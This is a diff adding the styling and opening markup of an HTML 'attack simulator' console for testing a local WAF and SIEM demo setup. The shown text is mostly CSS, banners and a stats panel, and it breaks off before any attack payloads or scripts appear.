@@ -1,0 +1,1679 @@
+<!DOCTYPE html>
+<!-- VIREX Attack Simulator — Target: Nginx WAF Gateway (localhost:8060) -->
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VIREX — Attack Simulator</title>
+  <meta name="description" content="VIREX Security Attack Simulator — Demo tool for testing WAF blocking and SIEM logging capabilities." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+
+  <style>
+    /* ─────────────────────────────────────────────
+       DESIGN TOKENS
+    ───────────────────────────────────────────── */
+    :root {
+      --clr-bg:          #04020a;
+      --clr-bg2:         #08041a;
+      --clr-surface:     rgba(18, 8, 40, 0.72);
+      --clr-surface2:    rgba(28, 10, 60, 0.55);
+      --clr-border:      rgba(149, 7, 193, 0.35);
+      --clr-border-blue: rgba(0, 212, 255, 0.28);
+
+      --neon-purple:     #9507c1;
+      --neon-purple-lt:  #c040f5;
+      --neon-purple-glow:#9507c180;
+      --neon-blue:       #00d4ff;
+      --neon-blue-glow:  #00d4ff60;
+      --neon-red:        #ff2d55;
+      --neon-green:      #0dffaa;
+      --neon-yellow:     #ffd600;
+
+      --txt-primary:     #e8d8ff;
+      --txt-secondary:   #9980bb;
+      --txt-muted:       #5a4a72;
+
+      --radius-sm: 6px;
+      --radius-md: 12px;
+      --radius-lg: 18px;
+
+      --glass-blur: blur(20px) saturate(160%);
+      --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* ─────────────────────────────────────────────
+       RESET & BASE
+    ───────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--clr-bg);
+      color: var(--txt-primary);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* ─────────────────────────────────────────────
+       ANIMATED BACKGROUND
+    ───────────────────────────────────────────── */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 80% 60% at 15% 10%,  rgba(149,7,193,0.14) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 50% at 85% 80%,  rgba(0,212,255,0.08) 0%, transparent 55%),
+        radial-gradient(ellipse 50% 40% at 50% 50%,  rgba(149,7,193,0.05) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(149,7,193,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(149,7,193,0.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .scanlines {
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,0,0,0.06) 2px,
+        rgba(0,0,0,0.06) 4px
+      );
+      pointer-events: none;
+      z-index: 1000;
+      animation: scanMove 8s linear infinite;
+    }
+
+    @keyframes scanMove {
+      0%   { background-position: 0 0; }
+      100% { background-position: 0 100px; }
+    }
+
+    /* ─────────────────────────────────────────────
+       FLOATING PARTICLES
+    ───────────────────────────────────────────── */
+    .particles { position: fixed; inset: 0; pointer-events: none; z-index: 1; overflow: hidden; }
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      opacity: 0;
+      animation: floatUp linear infinite;
+    }
+
+    @keyframes floatUp {
+      0%   { transform: translateY(100vh) scale(0); opacity: 0; }
+      10%  { opacity: 1; }
+      90%  { opacity: 0.6; }
+      100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+    }
+
+    /* ─────────────────────────────────────────────
+       LAYOUT
+    ───────────────────────────────────────────── */
+    .app-wrapper {
+      position: relative;
+      z-index: 10;
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 2rem 1.25rem 4rem;
+    }
+
+    /* ─────────────────────────────────────────────
+       HEADER
+    ───────────────────────────────────────────── */
+    header {
+      text-align: center;
+      padding: 2.5rem 0 2rem;
+    }
+
+    .logo-mark {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.7rem;
+      margin-bottom: 1rem;
+    }
+
+    .logo-icon {
+      width: 48px;
+      height: 48px;
+      background: linear-gradient(135deg, var(--neon-purple), var(--neon-blue));
+      border-radius: var(--radius-md);
+      display: grid;
+      place-items: center;
+      font-size: 1.5rem;
+      box-shadow: 0 0 20px var(--neon-purple-glow), 0 0 40px rgba(0,212,255,0.15);
+      animation: iconPulse 3s ease-in-out infinite;
+    }
+
+    @keyframes iconPulse {
+      0%, 100% { box-shadow: 0 0 20px var(--neon-purple-glow), 0 0 40px rgba(0,212,255,0.15); }
+      50%       { box-shadow: 0 0 35px var(--neon-purple-glow), 0 0 60px rgba(0,212,255,0.30); }
+    }
+
+    .logo-text {
+      font-family: 'Orbitron', monospace;
+      font-weight: 900;
+      font-size: 1.9rem;
+      letter-spacing: 0.15em;
+      background: linear-gradient(90deg, var(--neon-purple-lt), var(--neon-blue));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    h1 {
+      font-family: 'Orbitron', monospace;
+      font-size: clamp(1rem, 3vw, 1.35rem);
+      font-weight: 600;
+      color: var(--txt-secondary);
+      letter-spacing: 0.25em;
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+
+    .header-sub {
+      font-size: 0.82rem;
+      color: var(--txt-muted);
+      letter-spacing: 0.1em;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .header-line {
+      width: 200px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--neon-purple), transparent);
+      margin: 1rem auto;
+    }
+
+    .status-bar {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 1.5rem;
+      margin-top: 1.2rem;
+      flex-wrap: wrap;
+    }
+
+    .status-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      color: var(--txt-secondary);
+      background: var(--clr-surface);
+      backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--clr-border);
+      border-radius: 20px;
+      padding: 0.3rem 0.8rem;
+    }
+
+    .status-dot {
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: var(--neon-green);
+      box-shadow: 0 0 6px var(--neon-green);
+      animation: blink 1.5s ease-in-out infinite;
+    }
+
+    .status-dot.red   { background: var(--neon-red);  box-shadow: 0 0 6px var(--neon-red); }
+    .status-dot.blue  { background: var(--neon-blue); box-shadow: 0 0 6px var(--neon-blue); }
+    .status-dot.pulse { animation: blink 0.6s ease-in-out infinite; }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.3; }
+    }
+
+    /* ─────────────────────────────────────────────
+       WARNING BANNER
+    ───────────────────────────────────────────── */
+    .warning-banner {
+      background: rgba(255, 45, 85, 0.08);
+      border: 1px solid rgba(255, 45, 85, 0.35);
+      border-radius: var(--radius-md);
+      padding: 0.85rem 1.2rem;
+      margin-bottom: 1.8rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      backdrop-filter: var(--glass-blur);
+    }
+
+    .warning-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 1px; }
+    .warning-text { font-size: 0.78rem; color: rgba(255,180,180,0.9); line-height: 1.6; font-family: 'JetBrains Mono', monospace; }
+    .warning-text strong { color: var(--neon-red); }
+
+    /* ─────────────────────────────────────────────
+       GLASS CARD
+    ───────────────────────────────────────────── */
+    .glass-card {
+      background: var(--clr-surface);
+      backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--clr-border);
+      border-radius: var(--radius-lg);
+      padding: 1.8rem;
+      position: relative;
+      overflow: hidden;
+      transition: border-color var(--transition), box-shadow var(--transition);
+    }
+
+    .glass-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(149,7,193,0.06) 0%, transparent 60%);
+      pointer-events: none;
+    }
+
+    .glass-card:hover {
+      border-color: rgba(149,7,193,0.6);
+      box-shadow: 0 0 30px rgba(149,7,193,0.12);
+    }
+
+    /* ─────────────────────────────────────────────
+       SECTION TITLES
+    ───────────────────────────────────────────── */
+    .section-title {
+      font-family: 'Orbitron', monospace;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--neon-purple-lt);
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .section-title::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(90deg, var(--clr-border), transparent);
+    }
+
+    /* ─────────────────────────────────────────────
+       FORM GRID
+    ───────────────────────────────────────────── */
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    @media (max-width: 640px) { .form-grid { grid-template-columns: 1fr; } }
+
+    /* ─────────────────────────────────────────────
+       FORM ELEMENTS
+    ───────────────────────────────────────────── */
+    .field-group { display: flex; flex-direction: column; gap: 0.5rem; }
+
+    label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.73rem;
+      font-weight: 500;
+      color: var(--txt-secondary);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .field-input,
+    .field-select,
+    .field-textarea {
+      width: 100%;
+      background: rgba(8, 4, 26, 0.75);
+      border: 1px solid var(--clr-border);
+      border-radius: var(--radius-sm);
+      color: var(--txt-primary);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      padding: 0.7rem 0.9rem;
+      outline: none;
+      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .field-input::placeholder { color: var(--txt-muted); }
+
+    .field-input:focus,
+    .field-select:focus,
+    .field-textarea:focus {
+      border-color: var(--neon-purple);
+      box-shadow: 0 0 0 3px rgba(149,7,193,0.15), 0 0 15px rgba(149,7,193,0.1);
+      background: rgba(12, 6, 35, 0.9);
+    }
+
+    .field-select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%239507c1' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 0.9rem center;
+      padding-right: 2.5rem;
+      cursor: pointer;
+    }
+
+    .field-select option { background: #0c0620; color: var(--txt-primary); }
+
+    .field-textarea {
+      resize: vertical;
+      min-height: 130px;
+      line-height: 1.6;
+    }
+
+    /* ─────────────────────────────────────────────
+       ATTACK VECTOR CARDS
+    ───────────────────────────────────────────── */
+    .vector-cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+      gap: 0.6rem;
+      margin-bottom: 1.4rem;
+    }
+
+    .vector-card {
+      background: rgba(8, 4, 26, 0.6);
+      border: 1px solid var(--clr-border);
+      border-radius: var(--radius-sm);
+      padding: 0.75rem 0.6rem;
+      cursor: pointer;
+      text-align: center;
+      transition: all var(--transition);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .vector-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, var(--neon-purple), var(--neon-blue));
+      opacity: 0;
+      transition: opacity var(--transition);
+    }
+
+    .vector-card:hover::before,
+    .vector-card.active::before { opacity: 0.12; }
+
+    .vector-card.active {
+      border-color: var(--neon-purple);
+      box-shadow: 0 0 15px rgba(149,7,193,0.25), inset 0 0 10px rgba(149,7,193,0.06);
+    }
+
+    .vector-card:hover {
+      border-color: rgba(149,7,193,0.7);
+      transform: translateY(-2px);
+    }
+
+    .vector-icon {
+      font-size: 1.4rem;
+      margin-bottom: 0.35rem;
+      display: block;
+      position: relative;
+      z-index: 1;
+    }
+
+    .vector-name {
+      font-family: 'Orbitron', monospace;
+      font-size: 0.62rem;
+      font-weight: 600;
+      letter-spacing: 0.1em;
+      color: var(--txt-secondary);
+      text-transform: uppercase;
+      position: relative;
+      z-index: 1;
+      transition: color var(--transition);
+    }
+
+    .vector-card.active .vector-name { color: var(--neon-purple-lt); }
+
+    .risk-badge {
+      position: absolute;
+      top: 4px; right: 4px;
+      font-size: 0.5rem;
+      font-family: 'Orbitron', monospace;
+      padding: 1px 5px;
+      border-radius: 3px;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+    }
+
+    .risk-critical { background: rgba(255,45,85,0.2);   color: var(--neon-red);    border: 1px solid rgba(255,45,85,0.3); }
+    .risk-high     { background: rgba(255,160,0,0.2);   color: #ff9800;            border: 1px solid rgba(255,160,0,0.3); }
+    .risk-medium   { background: rgba(0,212,255,0.12);  color: var(--neon-blue);   border: 1px solid rgba(0,212,255,0.25); }
+
+    /* ─────────────────────────────────────────────
+       PAYLOAD HEADER
+    ───────────────────────────────────────────── */
+    .payload-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .payload-chip {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.68rem;
+      padding: 0.2rem 0.65rem;
+      border-radius: 20px;
+      background: rgba(149,7,193,0.15);
+      border: 1px solid rgba(149,7,193,0.3);
+      color: var(--neon-purple-lt);
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    /* ─────────────────────────────────────────────
+       OPTIONS ROW
+    ───────────────────────────────────────────── */
+    .options-row {
+      display: flex;
+      gap: 1rem;
+      align-items: flex-end;
+      flex-wrap: wrap;
+    }
+
+    .options-row .field-group { flex: 1; min-width: 140px; }
+
+    .toggle-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .toggle-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.73rem;
+      color: var(--txt-secondary);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .toggle-row {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      cursor: pointer;
+    }
+
+    .toggle-switch {
+      width: 38px; height: 20px;
+      background: rgba(149,7,193,0.2);
+      border-radius: 10px;
+      border: 1px solid var(--clr-border);
+      position: relative;
+      transition: background var(--transition), box-shadow var(--transition);
+      flex-shrink: 0;
+    }
+
+    .toggle-switch::after {
+      content: '';
+      position: absolute;
+      top: 2px; left: 2px;
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      background: var(--txt-muted);
+      transition: transform var(--transition), background var(--transition);
+    }
+
+    .toggle-input:checked + .toggle-switch {
+      background: rgba(149,7,193,0.5);
+      box-shadow: 0 0 10px rgba(149,7,193,0.4);
+    }
+
+    .toggle-input:checked + .toggle-switch::after {
+      transform: translateX(18px);
+      background: var(--neon-purple-lt);
+    }
+
+    .toggle-input { position: absolute; opacity: 0; width: 0; height: 0; }
+    .toggle-text { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--txt-secondary); }
+
+    /* ─────────────────────────────────────────────
+       LAUNCH BUTTON
+    ───────────────────────────────────────────── */
+    .launch-btn {
+      width: 100%;
+      padding: 1rem;
+      font-family: 'Orbitron', monospace;
+      font-size: 0.9rem;
+      font-weight: 700;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: #fff;
+      background: linear-gradient(135deg, var(--neon-purple) 0%, #6200a0 50%, var(--neon-purple) 100%);
+      background-size: 200% 100%;
+      border: none;
+      border-radius: var(--radius-md);
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: all var(--transition);
+      margin-top: 1.5rem;
+      box-shadow:
+        0 0 20px rgba(149,7,193,0.4),
+        0 4px 24px rgba(149,7,193,0.25),
+        inset 0 1px 0 rgba(255,255,255,0.12);
+    }
+
+    .launch-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.08) 50%, transparent 100%);
+      transform: translateX(-100%);
+      transition: transform 0.6s ease;
+    }
+
+    .launch-btn:hover::before { transform: translateX(100%); }
+
+    .launch-btn:hover {
+      background-position: 100% 0;
+      box-shadow:
+        0 0 35px rgba(149,7,193,0.65),
+        0 8px 32px rgba(149,7,193,0.4),
+        inset 0 1px 0 rgba(255,255,255,0.18);
+      transform: translateY(-2px);
+    }
+
+    .launch-btn:active { transform: translateY(0); }
+
+    .launch-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .launch-btn .btn-inner {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    .btn-icon { font-size: 1.1rem; }
+
+    /* ─────────────────────────────────────────────
+       PROGRESS BAR
+    ───────────────────────────────────────────── */
+    .attack-progress {
+      margin-top: 1.2rem;
+      display: none;
+    }
+
+    .attack-progress.visible { display: block; }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      color: var(--txt-secondary);
+      margin-bottom: 0.4rem;
+    }
+
+    .progress-bar-wrap {
+      height: 5px;
+      background: rgba(149,7,193,0.12);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--neon-purple), var(--neon-blue));
+      border-radius: 3px;
+      width: 0%;
+      transition: width 0.1s linear;
+      box-shadow: 0 0 8px var(--neon-purple-glow);
+    }
+
+    /* ─────────────────────────────────────────────
+       STATS STRIP
+    ───────────────────────────────────────────── */
+    .stats-strip {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+
+    @media (max-width: 600px) { .stats-strip { grid-template-columns: repeat(2, 1fr); } }
+
+    .stat-card {
+      background: var(--clr-surface2);
+      backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--clr-border);
+      border-radius: var(--radius-md);
+      padding: 0.9rem;
+      text-align: center;
+      transition: all var(--transition);
+    }
+
+    .stat-card:hover {
+      border-color: rgba(149,7,193,0.5);
+      transform: translateY(-2px);
+    }
+
+    .stat-value {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 0.2rem;
+      transition: color 0.3s;
+    }
+
+    .stat-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--txt-muted);
+    }
+
+    .stat-total   .stat-value { color: var(--neon-blue); }
+    .stat-blocked .stat-value { color: var(--neon-purple-lt); }
+    .stat-passed  .stat-value { color: var(--neon-yellow); }
+    .stat-error   .stat-value { color: var(--neon-red); }
+
+    /* ─────────────────────────────────────────────
+       TERMINAL
+    ───────────────────────────────────────────── */
+    .terminal-card {
+      background: rgba(3, 1, 12, 0.92);
+      border: 1px solid var(--clr-border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      backdrop-filter: var(--glass-blur);
+    }
+
+    .terminal-titlebar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.65rem 1rem;
+      background: rgba(149,7,193,0.08);
+      border-bottom: 1px solid var(--clr-border);
+    }
+
+    .terminal-dots { display: flex; gap: 0.4rem; }
+    .t-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .t-dot-red    { background: #ff5f57; }
+    .t-dot-yellow { background: #ffbd2e; }
+    .t-dot-green  { background: #28c840; }
+
+    .terminal-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      color: var(--txt-secondary);
+      letter-spacing: 0.08em;
+    }
+
+    .terminal-actions { display: flex; gap: 0.5rem; }
+
+    .terminal-btn {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.65rem;
+      color: var(--txt-muted);
+      background: transparent;
+      border: 1px solid var(--clr-border);
+      border-radius: 4px;
+      padding: 0.2rem 0.5rem;
+      cursor: pointer;
+      transition: all var(--transition);
+    }
+
+    .terminal-btn:hover { color: var(--neon-purple-lt); border-color: rgba(149,7,193,0.5); }
+
+    .terminal-body {
+      padding: 1rem;
+      height: 280px;
+      overflow-y: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      line-height: 1.75;
+    }
+
+    .terminal-body::-webkit-scrollbar { width: 5px; }
+    .terminal-body::-webkit-scrollbar-track { background: transparent; }
+    .terminal-body::-webkit-scrollbar-thumb { background: rgba(149,7,193,0.35); border-radius: 3px; }
+
+    .log-line {
+      display: flex;
+      gap: 0.6rem;
+      align-items: flex-start;
+      animation: logSlide 0.2s ease;
+      padding: 0.1rem 0;
+    }
+
+    @keyframes logSlide {
+      from { opacity: 0; transform: translateX(-8px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .log-time { color: var(--txt-muted); flex-shrink: 0; }
+    .log-tag  { flex-shrink: 0; font-weight: 600; min-width: 8ch; }
+    .tag-sys  { color: var(--neon-blue); }
+    .tag-atk  { color: var(--neon-purple-lt); }
+    .tag-ok   { color: var(--neon-green); }
+    .tag-err  { color: var(--neon-red); }
+    .tag-warn { color: var(--neon-yellow); }
+    .tag-info { color: #888; }
+    .log-msg  { color: var(--txt-primary); word-break: break-all; }
+
+    .cursor-blink {
+      display: inline-block;
+      width: 8px;
+      height: 13px;
+      background: var(--neon-purple-lt);
+      animation: blink 1s step-end infinite;
+      vertical-align: middle;
+      margin-left: 2px;
+      border-radius: 1px;
+    }
+
+    /* ─────────────────────────────────────────────
+       RESPONSE VIEWER
+    ───────────────────────────────────────────── */
+    .response-viewer { margin-top: 1.5rem; display: none; }
+    .response-viewer.visible { display: block; }
+
+    .response-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    @media (max-width: 640px) { .response-grid { grid-template-columns: 1fr; } }
+
+    .response-box {
+      background: rgba(3, 1, 12, 0.85);
+      border: 1px solid var(--clr-border);
+      border-radius: var(--radius-md);
+      padding: 1rem;
+    }
+
+    .response-box-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.68rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 0.7rem;
+    }
+
+    .response-status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      padding: 0.3rem 0.8rem;
+      border-radius: 5px;
+      font-family: 'Orbitron', monospace;
+      font-size: 0.8rem;
+      font-weight: 700;
+      margin-bottom: 0.6rem;
+    }
+
+    .status-blocked { background: rgba(149,7,193,0.2); border: 1px solid rgba(149,7,193,0.4); color: var(--neon-purple-lt); }
+    .status-allowed { background: rgba(255,214,0,0.12); border: 1px solid rgba(255,214,0,0.3); color: var(--neon-yellow); }
+    .status-error   { background: rgba(255,45,85,0.12); border: 1px solid rgba(255,45,85,0.3); color: var(--neon-red); }
+
+    .response-body-text {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.73rem;
+      color: var(--txt-secondary);
+      line-height: 1.6;
+      max-height: 120px;
+      overflow-y: auto;
+      word-break: break-all;
+    }
+
+    /* ─────────────────────────────────────────────
+       GLOW DIVIDER & FOOTER
+    ───────────────────────────────────────────── */
+    .glow-divider {
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--neon-purple), var(--neon-blue), transparent);
+      margin: 2rem 0;
+      opacity: 0.4;
+    }
+
+    .section-gap { margin-bottom: 1.5rem; }
+
+    footer {
+      text-align: center;
+      margin-top: 3rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.68rem;
+      color: var(--txt-muted);
+      letter-spacing: 0.06em;
+    }
+
+    footer span { color: var(--neon-purple-lt); }
+
+    /* ─────────────────────────────────────────────
+       RUN BANNER (blue variant)
+    ───────────────────────────────────────────── */
+    .run-banner {
+      background: rgba(0, 212, 255, 0.06);
+      border: 1px solid rgba(0, 212, 255, 0.3);
+      border-radius: var(--radius-md);
+      padding: 0.85rem 1.2rem;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      backdrop-filter: var(--glass-blur);
+    }
+
+    .warning-banner {
+      background: rgba(255, 45, 85, 0.08);
+      border: 1px solid rgba(255, 45, 85, 0.35);
+      border-radius: var(--radius-md);
+      padding: 0.85rem 1.2rem;
+      margin-bottom: 1.8rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      backdrop-filter: var(--glass-blur);
+    }
+
+    .warning-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 1px; }
+    .warning-text {
+      font-size: 0.78rem;
+      color: rgba(255,180,180,0.9);
+      line-height: 1.7;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .run-banner .warning-text { color: rgba(200,240,255,0.85); }
+    .warning-text strong { color: var(--neon-red); }
+
+    /* ─────────────────────────────────────────────
+       QUICK ENDPOINT BUTTONS
+    ───────────────────────────────────────────── */
+    .quick-ep-btn {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7rem;
+      color: var(--neon-blue);
+      background: rgba(0, 212, 255, 0.06);
+      border: 1px solid rgba(0, 212, 255, 0.3);
+      border-radius: 5px;
+      padding: 0.3rem 0.75rem;
+      cursor: pointer;
+      transition: all var(--transition);
+      white-space: nowrap;
+    }
+
+    .quick-ep-btn:hover {
+      background: rgba(0, 212, 255, 0.15);
+      border-color: var(--neon-blue);
+      box-shadow: 0 0 10px rgba(0,212,255,0.2);
+      color: #fff;
+    }
+
+    /* ─────────────────────────────────────────────
+       ATTACK FLASH OVERLAY
+    ───────────────────────────────────────────── */
+    .attack-flash {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 999;
+      opacity: 0;
+    }
+
+    .attack-flash.fire {
+      animation: flashAnim 0.4s ease-out forwards;
+    }
+
+    @keyframes flashAnim {
+      0%   { opacity: 0; background: radial-gradient(ellipse at center, rgba(149,7,193,0.25), transparent 70%); }
+      30%  { opacity: 1; }
+      100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Scanlines -->
+<div class="scanlines"></div>
+<!-- Floating particles -->
+<div class="particles" id="particles"></div>
+<!-- Attack flash overlay -->
+<div class="attack-flash" id="attackFlash"></div>
+
+<div class="app-wrapper">
+
+  <!-- ═══════════════════ HEADER ═══════════════════ -->
+  <header>
+    <div class="logo-mark">
+      <div class="logo-icon">🛡️</div>
+      <span class="logo-text">VIREX</span>
+    </div>
+    <h1>Attack Simulator Console</h1>
+    <p class="header-sub">// WAF &amp; SIEM Penetration Testing Interface v2.0</p>
+    <div class="header-line"></div>
+    <div class="status-bar">
+      <div class="status-badge"><div class="status-dot"></div> WAF ENGINE ONLINE</div>
+      <div class="status-badge"><div class="status-dot blue pulse"></div> SIEM MONITORING</div>
+      <div class="status-badge"><div class="status-dot red"></div> DEMO MODE</div>
+    </div>
+  </header>
+
+  <!-- ═══════════════════ HOW TO RUN ═══════════════════ -->
+  <div class="run-banner">
+    <span class="warning-icon">💡</span>
+    <div class="warning-text">
+      <strong style="color:var(--neon-blue)">HOW TO RUN (مهم)</strong> — لازم تفتح الـ file من خلال local server مش double-click مباشرة،
+      عشان الـ browser يسمح بالـ requests.<br/>
+      <span style="color:var(--neon-green)">▶ شغّل في الـ terminal:</span>
+      <code style="background:rgba(0,212,255,0.1);padding:2px 8px;border-radius:4px;color:var(--neon-blue);">python -m http.server 9000</code>
+      ثم افتح: <code style="background:rgba(0,212,255,0.1);padding:2px 8px;border-radius:4px;color:var(--neon-blue);">http://localhost:9000/attack_simulator.html</code><br/>
+      <span style="color:var(--txt-muted)">تأكد إن الـ Docker containers شغّالة أولاً (</span><code style="color:var(--neon-yellow)">docker compose up</code><span style="color:var(--txt-muted)">)</span>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ WARNING ═══════════════════ -->
+  <div class="warning-banner">
+    <span class="warning-icon">⚠️</span>
+    <div class="warning-text">
+      <strong>AUTHORIZED USE ONLY</strong> — This tool is designed exclusively for testing the VIREX WAF/SIEM system against
+      <strong>your own backend infrastructure</strong>. Sending attack payloads to third-party systems without explicit
+      written permission is <strong>illegal</strong>.
+    </div>
+  </div>
+
+  <!-- ═══════════════════ STATS ═══════════════════ -->
+  <div class="stats-strip">
+    <div class="stat-card stat-total">
+      <div class="stat-value" id="statTotal">0</div>
+      <div class="stat-label">Total Sent</div>
+    </div>
+    <div class="stat-card stat-blocked">
+      <div class="stat-value" id="statBlocked">0</div>
+      <div class="stat-label">WAF Blocked</div>
+    </div>
+    <div class="stat-card stat-passed">
+      <div class="stat-value" id="statPassed">0</div>
+      <div class="stat-label">Passed Through</div>
+    </div>
+    <div class="stat-card stat-error">
+      <div class="stat-value" id="statError">0</div>
+      <div class="stat-label">Errors</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ MISSION CONFIG ═══════════════════ -->
+  <div class="glass-card section-gap">
+    <div class="section-title">⚙️ Mission Config</div>
+
+    <!-- Quick endpoint buttons -->
+    <div style="margin-bottom:1rem;">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--txt-muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.5rem;">⚡ Quick Endpoints (Nginx WAF Gateway)</div>
+      <div style="display:flex;gap:.5rem;flex-wrap:wrap;">
